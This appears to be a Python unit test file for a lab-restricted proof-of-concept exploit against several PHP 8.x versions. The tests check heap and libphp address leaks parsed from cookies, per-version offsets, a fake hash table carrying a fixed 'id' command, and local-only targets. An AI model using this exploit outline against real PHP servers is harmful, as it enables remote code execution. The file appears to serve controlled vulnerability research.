import struct
import unittest

import poc


class PocUnitTests(unittest.TestCase):
    def test_supported_profiles_are_exact(self):
        self.assertEqual(
            tuple(poc.PROFILES),
            ("8.2.34", "8.3.35", "8.4.26", "8.5.11"),
        )

    def test_command_is_fixed_and_benign(self):
        self.assertEqual(poc.COMMAND, b"id>/out/p1")

    def test_network_targets_are_local_lab_only(self):
        self.assertEqual(
            poc.ALLOWED_TARGETS,
            ("target:80", "127.0.0.1:8088", "localhost:8088"),
        )

    def test_heap_disclosure_parser(self):
        expected = 0x740000000000
        pointer = struct.pack("<Q", expected + 0x12340)
        cookie = b"A" * 1024 + pointer * 12
        self.assertEqual(poc.heap_base(cookie), expected)

    def test_libphp_disclosure_parser(self):
        profile = poc.PROFILES["8.4.26"]
        expected = 0x740010000000
        cookie = b"A" * 8 + struct.pack(
            "<Q", expected + profile.zval_ptr_dtor_offset
        )
        self.assertEqual(
            poc.libphp_base(cookie, profile.zval_ptr_dtor_offset), expected
        )

    def test_fake_table_contains_only_fixed_command(self):
        table = poc.LabProof.fake_hash_table(0x7400000690D8, 0x740010465370)
        self.assertIn(poc.COMMAND + b"\x00", table)

    def test_auto_profile_selection(self):
        self.assertIs(
            poc.selected_profile("auto", "8.5.11"), poc.PROFILES["8.5.11"]
        )

    def test_unknown_auto_profile_is_rejected(self):
        with self.assertRaises(RuntimeError):
            poc.selected_profile("auto", "9.0.0")


if __name__ == "__main__":
    unittest.main()
